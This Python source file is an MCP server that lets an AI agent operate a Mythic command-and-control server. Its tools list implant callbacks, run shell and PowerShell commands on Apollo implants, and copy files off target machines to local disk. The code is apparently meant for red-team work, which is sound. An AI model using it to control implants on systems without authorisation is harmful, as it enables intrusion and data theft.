#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "fastmcp>=2.0",
#   "mythic>=0.2",
# ]
# ///
"""Mythic C2 MCP server — wraps the Mythic Python SDK for server and implant interaction.

Env vars:
  MYTHIC_SERVER_IP    (default: 127.0.0.1)
  MYTHIC_SERVER_PORT  (default: 443)
  MYTHIC_USERNAME     (default: mythic_admin)
  MYTHIC_PASSWORD     (required unless provided via connect tool)
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path
from typing import Annotated, Any

from fastmcp import FastMCP
from mythic import mythic as mythic_sdk

mcp = FastMCP("mythic")

MAX_OUTPUT_CHARS = 1_048_576  # 1 MB

# ── Connection state ─────────────────────────────────────────────────

_client: Any | None = None
_config: dict[str, Any] = {}


def _default_config() -> dict[str, Any]:
    return {
        "server_ip": os.environ.get("MYTHIC_SERVER_IP", "127.0.0.1"),
        "server_port": int(os.environ.get("MYTHIC_SERVER_PORT", "443")),
        "username": os.environ.get("MYTHIC_USERNAME", "mythic_admin"),
        "password": os.environ.get("MYTHIC_PASSWORD", ""),
        "timeout": int(os.environ.get("MYTHIC_TIMEOUT", "-1")),
    }


async def _get_client() -> Any:
    global _client, _config
    if _client is not None:
        return _client
    if not _config:
        _config = _default_config()
    if not _config["password"]:
        raise RuntimeError(
            "Not connected. Call connect(password=...) or set MYTHIC_PASSWORD env var."
        )
    _client = await mythic_sdk.login(
        username=_config["username"],
        password=_config["password"],
        server_ip=_config["server_ip"],
        server_port=_config["server_port"],
        timeout=_config["timeout"],
    )
    return _client


def _truncate(text: str) -> str:
    if len(text) <= MAX_OUTPUT_CHARS:
        return text
    half = MAX_OUTPUT_CHARS // 2
    return text[:half] + "\n...[truncated]...\n" + text[-half:]


# ── Connection tools ─────────────────────────────────────────────────


@mcp.tool
async def connect(
    server_ip: Annotated[str | None, "Mythic server IP"] = None,
    server_port: Annotated[int | None, "Mythic server port"] = None,
    username: Annotated[str | None, "Mythic username"] = None,
    password: Annotated[str | None, "Mythic password"] = None,
) -> str:
    """Connect to a Mythic C2 server. Overrides env var defaults for this session."""
    global _client, _config
    _client = None
    _config = _default_config()
    if server_ip:
        _config["server_ip"] = server_ip
    if server_port:
        _config["server_port"] = server_port
    if username:
        _config["username"] = username
    if password:
        _config["password"] = password
    client = await _get_client()
    return f"Connected to Mythic at {_config['server_ip']}:{_config['server_port']} as {_config['username']}"


# ── Server tools ─────────────────────────────────────────────────────


@mcp.tool
async def get_callbacks() -> list[dict]:
    """List all active Mythic callbacks (implant connections), sorted by most recent check-in."""
    client = await _get_client()
    cbs = await mythic_sdk.get_all_active_callbacks(
        client,
        "display_id,id,host,user,domain,integrity_level,ip,process_name,pid,"
        "payload{os,payloadtype{name},description},last_checkin",
    )
    return sorted(cbs, key=lambda x: x["last_checkin"], reverse=True)


@mcp.tool
async def upload_file(
    filepath: Annotated[str, "Local file path to upload to the Mythic server"],
    reupload: Annotated[bool, "Re-upload if file already exists on server"] = True,
) -> dict | str:
    """Upload a local file to the Mythic server for use with callbacks."""
    client = await _get_client()
    filename = Path(filepath).name
    if not reupload:
        existing = await check_file(filename=filename)
        if isinstance(existing, dict):
            return {"filename": filename, "file_id": existing["agent_file_id"]}
    contents = Path(filepath).read_text()
    file_id = await mythic_sdk.register_file(
        mythic=client, filename=filename, contents=contents.encode("utf-8")
    )
    return {"filename": filename, "file_id": file_id}


@mcp.tool
async def check_file(
    filename: Annotated[str, "Filename to check on the Mythic server"],
) -> dict | str:
    """Check if a file exists on the Mythic server."""
    client = await _get_client()
    attrs = "agent_file_id,filename_utf8,timestamp,deleted,is_download_from_agent,sha1,md5,complete"
    async for batch in mythic_sdk.get_all_uploaded_files(
        mythic=client, custom_return_attributes=attrs, batch_size=50
    ):
        for record in batch:
            if record["filename_utf8"] == filename and not record["deleted"]:
                return record
    return f"File '{filename}' not found on server."


@mcp.tool
async def download_file(
    filename: Annotated[str, "Name of the file to download from the Mythic server"],
) -> str:
    """Download a file from the Mythic server's downloaded files."""
    client = await _get_client()
    file_uuid = None
    async for batch in mythic_sdk.get_all_downloaded_files(
        mythic=client,
        custom_return_attributes="agent_file_id,filename_utf8,is_download_from_agent",
        batch_size=50,
    ):
        for f in batch:
            if f["filename_utf8"] == filename:
                file_uuid = f["agent_file_id"]
                break
        if file_uuid:
            break
    if file_uuid is None:
        return f"File '{filename}' not found on server."
    data = await mythic_sdk.download_file(mythic=client, file_uuid=file_uuid)
    return f"Downloaded '{filename}' ({len(data) / 1024:.1f} KB)"


# ── Implant tools (Apollo) ───────────────────────────────────────────


@mcp.tool
async def execute(
    callback_id: Annotated[int, "Apollo callback display ID"],
    command: Annotated[str, "Mythic command name (e.g. shell, ls, cat, cd, upload, download, execute_assembly, powershell)"],
    arguments: Annotated[str | dict, "Command arguments (string or dict depending on command)"] = "",
    timeout: Annotated[int | None, "Command timeout in seconds"] = None,
) -> str:
    """Execute a command on a Mythic Apollo implant. This is the primary tool for all implant interaction."""
    client = await _get_client()
    cfg = _config or _default_config()
    t = timeout if timeout is not None else cfg["timeout"]
    try:
        output = await mythic_sdk.issue_task_and_waitfor_task_output(
            mythic=client,
            command_name=command,
            parameters=arguments,
            callback_display_id=callback_id,
            timeout=t,
        )
    except Exception as e:
        return f"Error executing '{command}': {e}"
    if not output:
        return f"Command '{command}' returned no output."
    text = output.decode(errors="replace") if isinstance(output, bytes) else str(output)
    return _truncate(text)


@mcp.tool
async def download_to_local(
    callback_id: Annotated[int, "Apollo callback display ID"],
    remote_path: Annotated[str, "File path on the target system"],
) -> dict | str:
    """Download a file from a target via Mythic callback, saving it locally."""
    client = await _get_client()
    cfg = _config or _default_config()
    # 1. Download from target to Mythic server
    try:
        await mythic_sdk.issue_task_and_waitfor_task_output(
            mythic=client,
            command_name="download",
            parameters=remote_path,
            callback_display_id=callback_id,
            timeout=cfg["timeout"],
        )
    except Exception as e:
        return f"Error downloading: {e}"
    # 2. Download from Mythic server to local
    filename = Path(remote_path).name
    fbytes = await mythic_sdk.download_file(mythic=client, file_uuid=filename)
    if fbytes is None:
        return f"File '{filename}' could not be retrieved from Mythic server."
    tmp = Path(tempfile.mkdtemp()) / filename
    tmp.write_bytes(fbytes)
    return {"name": filename, "path": str(tmp)}


if __name__ == "__main__":
    mcp.run(transport="stdio")
